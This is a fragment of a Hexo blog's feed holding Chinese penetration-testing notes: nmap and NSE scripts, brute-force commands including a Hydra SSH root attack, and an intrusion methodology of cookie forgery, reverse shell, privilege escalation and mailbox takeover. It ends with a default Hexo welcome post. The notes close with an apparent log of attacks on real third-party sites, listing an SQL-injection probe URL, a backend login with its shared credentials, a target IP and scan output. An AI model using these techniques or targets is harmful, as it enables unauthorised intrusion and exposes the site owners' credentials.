class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">1. 发送以太网数据包</span><br><span class="line">nmap --send-eth 192.168.1.111</span><br><span class="line"></span><br><span class="line">2. 网络层发送</span><br><span class="line">nmap --send-ip 192.168.1.111</span><br><span class="line"></span><br><span class="line">3. 假定拥有所有权</span><br><span class="line">nmap --privileged 192.168.1.111</span><br><span class="line"></span><br><span class="line">4. 在交互模式中启动</span><br><span class="line">nmap --interactive</span><br><span class="line"></span><br><span class="line">5. 查看 Nmap 版本号</span><br><span class="line">nmap -V</span><br><span class="line"></span><br><span class="line">6. 设置调试级别</span><br><span class="line">nmap -d (1-9) 192.168.1.111</span><br><span class="line"></span><br><span class="line">7. 跟踪发送接收的报文</span><br><span class="line">nmap --packet-trace -p 20-30 192.168.1.111</span><br><span class="line"></span><br><span class="line">8. 列举接口和路由</span><br><span class="line">nmap --iflist www.iteye.com</span><br><span class="line"></span><br><span class="line">9. 指定网络接口</span><br><span class="line">nmap -e eth0 192.168.1.111</span><br><span class="line"></span><br><span class="line">10. 继续中断扫描</span><br><span class="line">nmap -oG 1.txt -v 192.168.126.1/24</span><br><span class="line">nmap --resume 1.txt (继续扫描)</span><br><span class="line"></span><br><span class="line">11. Dnmap</span><br><span class="line">dnmap_server -f test (指定命令脚本)</span><br><span class="line">dnmap_client -s 192.168.1.107 -a test</span><br><span class="line"></span><br><span class="line">12. 编写 Nse 脚本</span><br><span class="line"></span><br><span class="line">    (1)    -- The scanning module --</span><br><span class="line">        author = "Wing"</span><br><span class="line">        categories = &#123;"version"&#125;</span><br><span class="line"></span><br><span class="line">        portrule = function(host,port)</span><br><span class="line">            return port.protocol == "tcp" and port.number == 80 and port.state == "open"</span><br><span class="line">        end</span><br><span class="line"></span><br><span class="line">        action = function(host,port)</span><br><span class="line">            return "Found!!!"</span><br><span class="line">        end</span><br><span class="line"></span><br><span class="line">    (2) -- The scanning module --</span><br><span class="line">        author = "Wing"</span><br><span class="line">        categories = &#123;"version"&#125;</span><br><span class="line"></span><br><span class="line">        local comm=require "comm"</span><br><span class="line">        require "shortport"</span><br><span class="line">        local http=require "http"</span><br><span class="line"></span><br><span class="line">        portrule = function(host,port)</span><br><span class="line">            return (port.number == 80) and (port.start=="open")</span><br><span class="line">        end</span><br><span class="line"></span><br><span class="line">        action = function(host,port)</span><br><span class="line">            local uri = "/admin.php"</span><br><span class="line">            local response = http.get(host,port,uri)</span><br><span class="line">            return "Found!!!"</span><br><span class="line">        end</span><br><span class="line"></span><br><span class="line">13. 探测防火墙</span><br><span class="line">nmap --script=firewalk --traceroute 192.168.1.111</span><br><span class="line"></span><br><span class="line">14. VMware认证破解</span><br><span class="line">nmap -p 902 --script vmauthd-brute 192.168.1.107</span><br><span class="line">123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172</span><br></pre></td></tr></table></figure><h4 id="十一-Nmap的保存和输出"><a href="#十一-Nmap的保存和输出" class="headerlink" title="十一. Nmap的保存和输出"></a>十一. Nmap的保存和输出</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1. 标准保存</span><br><span class="line">nmap -F -oN d:/test1.txt 192.168.1.111</span><br><span class="line"></span><br><span class="line">2. XML保存</span><br><span class="line">nmap -F -oX d:/test1.xml 192.168.1.111</span><br><span class="line"></span><br><span class="line">3. 133t 保存</span><br><span class="line">nmap -F -oS d:/test2.txt 192.168.1.111</span><br><span class="line"></span><br><span class="line">4. Grep 保存</span><br><span class="line">nmap -F -oG d:/test2.txt 192.168.1.111</span><br><span class="line"></span><br><span class="line">5. 保存到所有格式</span><br><span class="line">nmap -F -oA d:/test2 192.168.1.111</span><br><span class="line"></span><br><span class="line">6. 补充保存文件</span><br><span class="line">nmap -F -append-output -oN d:/test2.txt 192.168.1.111</span><br><span class="line"></span><br><span class="line">7. 转换 XML 保存</span><br><span class="line">nmap -F -oX testB.xml --stylesheet http://www.insecure.org/nmap/data/nmap.xsl 192.168.1.111</span><br><span class="line"></span><br><span class="line">8. 忽略 XML 声明的 XSL 样式表</span><br><span class="line">nmap -oX d:/testC.xml --no-stylesheet 192.168.1.111</span><br></pre></td></tr></table></figure><p>常用指令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.1.100        # 查看一个主机是否在线</span><br><span class="line"></span><br><span class="line">nmap 192.168.1.100            # 查看一个主机上开放的端口</span><br><span class="line"></span><br><span class="line">nmap -sV -O 192.168.0.100    # 判断目标操作系统类型</span><br><span class="line"></span><br><span class="line">nmap -sS 192.168.1.100        # 半开放syn扫描</span><br><span class="line"></span><br><span class="line">nmap -p 1-1000 192.168.1.100  # 扫描指定端口范围</span><br><span class="line"></span><br><span class="line">nmap -p 80 192.168.1.100      # 扫描特定端口</span><br><span class="line"></span><br><span class="line">nmap -sV 192.168.1.100    # 查看目标开放端口对应的协议及版本信息</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 判断防火墙的扫描</span></span><br><span class="line">nmap -sF IP</span><br><span class="line">nmap -sA IP</span><br><span class="line">nmap -sW IP //ACK,探测防火墙扫描</span><br></pre></td></tr></table></figure><blockquote><p>  其他参数<br>  -sT 全连接扫描，更慢，会被服务器记录日志，但不易被入侵检测系统检测到<br>  -Pn 跳过Ping测试(防火墙)，扫描指定目标<br>  -v 详细模式V越多就越详细<br>  -p 80 ping指定端口<br>  –script=script_name 使用脚本<br>  <a href="http://nmap.org/nsedoc/scripts/" target="_blank" rel="noopener">脚本列表</a></p></blockquote><p><strong>nmap脚本扫描：分类：</strong></p><blockquote><p>  auth: 负责处理鉴权证书（绕开鉴权）的脚本</p></blockquote><blockquote><p>  broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务</p></blockquote><blockquote><p>  brute: 提供暴力破解方式，针对常见的应用如http/snmp等</p></blockquote><blockquote><p>  default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力</p></blockquote><blockquote><p>  discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等</p></blockquote><blockquote><p>  dos: 用于进行拒绝服务攻击</p></blockquote><blockquote><p>  exploit: 利用已知的漏洞入侵系统</p></blockquote><blockquote><p>  external: 利用第三方的数据库或资源，例如进行whois解析</p></blockquote><blockquote><p>  fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽</p></blockquote><blockquote><p>  malware: 探测目标机是否感染了病毒、开启了后门等信息</p></blockquote><blockquote><p>  safe: 此类与intrusive相反，属于安全性脚本</p></blockquote><blockquote><p>  version: 负责增强服务与版本扫描（Version Detection）功能的脚本</p></blockquote><blockquote><p>  vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067</p></blockquote><p>使用实例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=auth IP  </span><br><span class="line">//负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令</span><br><span class="line">http-php-version     //获得PHP版本信息</span><br><span class="line">Http-enum               //枚举Web站点目录</span><br><span class="line">smtp-strangeport   //判断SMTP是否运行在默认端口</span><br><span class="line">dns-blacklist         //发现IP地址黑名单</span><br></pre></td></tr></table></figure><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=vuln 192.168.137.* //扫描常见漏洞</span><br><span class="line">smb-check-vulns  //检测smb漏洞</span><br><span class="line">samba-vuln-cve-2012-1182 //扫描Samba堆溢出漏洞</span><br></pre></td></tr></table></figure><hr><p>扫描wordpress应用的脚本</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.http-wordpress-plugins</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.http-wordpress-<span class="class"><span class="keyword">enum</span></span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.http-wordpress-brute</span><br></pre></td></tr></table></figure><p>测试WAF是否存在</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 80,443 --script=http-waf-detect 192.168.0.100</span><br><span class="line"></span><br><span class="line">nmap -p 80,443 --script=http-waf-fingerprint www.victom.com</span><br></pre></td></tr></table></figure><h3 id="masscan"><a href="#masscan" class="headerlink" title="masscan"></a>masscan</h3><p>masscan -p5070 172.16.5.0/24</p><h3 id="AWVS"><a href="#AWVS" class="headerlink" title="AWVS"></a>AWVS</h3><h3 id="Maltego"><a href="#Maltego" class="headerlink" title="Maltego"></a>Maltego</h3><h3 id="Social-Engineer-Toolkit"><a href="#Social-Engineer-Toolkit" class="headerlink" title="Social-Engineer Toolkit"></a>Social-Engineer Toolkit</h3><h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><h3 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h3><p>爆破利器</p><p><strong>用法：</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hydra <span class="tag">&lt;<span class="name">参数</span>&gt;</span> <span class="tag">&lt;<span class="name">IP地址</span>&gt;</span> <span class="tag">&lt;<span class="name">服务名</span>&gt;</span>  </span><br><span class="line">hydra的一些参数:  </span><br><span class="line">-R 继续从上一次的进度开始爆破  </span><br><span class="line">-s <span class="tag">&lt;<span class="name">port</span>&gt;</span> 指定端口  </span><br><span class="line">-l <span class="tag">&lt;<span class="name">username</span>&gt;</span> 指定登录的用户名  </span><br><span class="line">-L <span class="tag">&lt;<span class="name">username-list</span>&gt;</span> 指定用户名字典  </span><br><span class="line">-p <span class="tag">&lt;<span class="name">password</span>&gt;</span> 指定密码  </span><br><span class="line">-t <span class="tag">&lt;<span class="name">number</span>&gt;</span> 设置线程数  </span><br><span class="line">-P <span class="tag">&lt;<span class="name">passwd-list</span>&gt;</span> 指定密码字典  </span><br><span class="line">-v 显示详细过程</span><br></pre></td></tr></table></figure><p>实例 爆破 ssh 登录密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -P /tmp/pass.txt -t 4 -v 192.168.57.101 ssh</span><br></pre></td></tr></table></figure><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li>信息收集 (whois email 电话 站长密码 生日 mail密码 办公段 服务器端 该公司的人员架构…)</li><li>主站迟迟拿不下，绝大部分二级域名泛解析到和主站的同一个 IP</li><li>入手二级域名，挨个排查，二级域名的个数差不多能有40个</li><li>根据二级域名的名字选择 upload edit 等等这种具有操作功能的站点入手</li><li>edit网站存在svn泄露，但是是最原始wc.db的形式，利用 sqlite 把源码还原出来</li><li>进行代码审计，快速定位代码，全文搜索 exec, upload 等等危险操作</li><li>审计到一个 exec 命令执行，发现需要用管理员权限</li><li>回溯代码，定位管理员登陆功能，审计处 cookie 算法可破解</li><li>伪造 cookie 反弹 shell，上去以后发现很多站点都在上面，权限不够</li><li>查看一下版本 (2.6.18-194.11.3.el5)</li><li>利用之前 ctf 中的一个一句话提权成功，然后大杀四方</li></ul><hr><ul><li>成功登陆后台 -&gt; getshell</li><li>getshell 失败 -&gt; 转换思路 -&gt; 挖掘其他漏洞 (sqlinjection) -&gt; 列库收集用户信息(外网撕出扣子网内网钻)</li><li>用户名密码 -&gt; 撞邮箱 -&gt; 在邮箱中搜索关键信息 -&gt; 拿到VPN</li><li>通过 VPN 访问文件服务器 -&gt; 写脚本 getshell</li></ul><hr><ul><li><p>xss -&gt; 打到后台 -&gt; 403 -&gt; ajax 抓取页面回转出来 -&gt; sql 注入 -&gt; getflag</p></li><li><p>Bypass Waf 注入 (%00,||,seselectlect等等) 国内CTF Web常见题型</p></li><li><p>代码审计 花式杂耍PHP各种特性(反序列化，弱类型等等)</p></li><li><p>文件上传 花式 Bypass 上传(.php111 .inc .phtml .phpt)</p></li><li><p>各种当前热点漏洞</p><p>扫描路径 -&gt; phpinfo -&gt; php7 -&gt; php7apachce -&gt; 查看文档 -&gt; 花式绕坑 -&gt; getshell</p></li><li><p>社会工程学(常用密码等等)</p></li><li><p>各种Web漏洞夹杂</p></li><li><p>具有内网环境的真是渗透场景 </p></li></ul><p><strong>信息收集：</strong></p><ul><li>web服务器：Apache、Tomcat、IIS</li><li>跑在什么系统上</li><li>可以利用已知漏洞绕过题目直接拿flag</li></ul><h2 id="日站记录"><a href="#日站记录" class="headerlink" title="日站记录"></a>日站记录</h2><p><a href="http://2nto4x.ijhz.cn/luodi/xiaoshuo/?pageid=20%20and%201=0" target="_blank" rel="noopener">http://2nto4x.ijhz.cn/luodi/xiaoshuo/?pageid=20%20and%201=0</a></p><p><a href="https://market.hzhangmeng.com/landingPage/register-keledai.html?owner=keledai&amp;channelCode=azuo" target="_blank" rel="noopener">https://market.hzhangmeng.com/landingPage/register-keledai.html?owner=keledai&amp;channelCode=azuo</a>    </p><p>后台<a href="http://139.196.127.175:8090/login.html" target="_blank" rel="noopener">http://139.196.127.175:8090/login.html</a>  账号密码一样 azuo</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ul><li>IP：154.80.253.139</li><li>可能域名：0539y.com</li><li>Server: Microsoft-IIS/10.0</li><li><p>X-Powered-By: ASP.NET</p></li><li><p>nmap 扫描</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE</span><br><span class="line">21/tcp   open  ftp</span><br><span class="line">80/tcp   open  http</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.4.X, Microsoft Windows XP|7|2012</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.4.37 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2012</span><br><span class="line">OS details: DD-WRT v24-sp2 (Linux 2.4.37), Microsoft Windows XP SP3, Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012</span><br></pre></td></tr></table></figure><ul><li>Nikto 扫描</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nikto -h http://example.com -output ~/nikto.html -Format htm</span><br><span class="line"><span class="meta">#</span><span class="bash"> 结果</span></span><br><span class="line">http://154.80.253.139/phpMyAdmin/index.php</span><br><span class="line">http://154.80.253.139:80/5cMlHAOg.aspx  # 暂时连不上</span><br><span class="line">http://154.80.253.139/phpMyAdmin/doc/html/index.html  # 偶然发现</span><br></pre></td></tr></table></figure><ul><li>最牛逼的信息收集网站</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">https://dnslytics.com/ip/154.80.253.139</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 旁站</span></span><br><span class="line">bjshuxue.com</span><br><span class="line">pinkewang.com</span><br><span class="line"><span class="meta">#</span><span class="bash"> 数据库信息</span></span><br><span class="line">[INFO] the back-end DBMS is Microsoft Access</span><br><span class="line">web server operating system: Windows 10 or 2016</span><br><span class="line">web application technology: ASP.NET, Microsoft IIS 10.0, ASP</span><br><span class="line">back-end DBMS: Microsoft Access</span><br><span class="line"></span><br><span class="line">i03.net</span><br><span class="line">tzsiss.com.cn</span><br><span class="line">cz-huatian.com</span><br><span class="line">nplxs.com</span><br><span class="line">wangmin.name</span><br><span class="line">4006080.com</span><br><span class="line">flyemail.cn</span><br><span class="line">zj5156.org</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 邮箱 2018-08-05</span></span><br><span class="line">mail.jianuo2.xyz</span><br><span class="line">mail.taiyangyy.top</span><br></pre></td></tr></table></figure><ul><li>目录扫描</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://154.80.253.139/phpMyAdmin/db_create.php  # 与 index.php 同界面</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;每天学点新东西&quot;&gt;&lt;a href=&quot;#每天学点新东西&quot; class=&quot;headerlink&quot; title=&quot;每天学点新东西&quot;&gt;&lt;/a&gt;每天学点新东西&lt;/h2&gt;&lt;p&gt;如果拿到了管理员 &lt;code&gt;cookie&lt;/code&gt;，可通过 &lt;code&gt;window.loca
      
    
    </summary>
    
    
      <category term="笔记" scheme="https://wywwzjj.top/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://wywwzjj.top/2018/01/25/hello-world/"/>
    <id>https://wywwzjj.top/2018/01/25/hello-world/</id>
    <published>2018-01-25T03:54:58.000Z</published>
    <updated>2019-02-26T10:59:53.991Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
    
  </entry>
  
</feed>
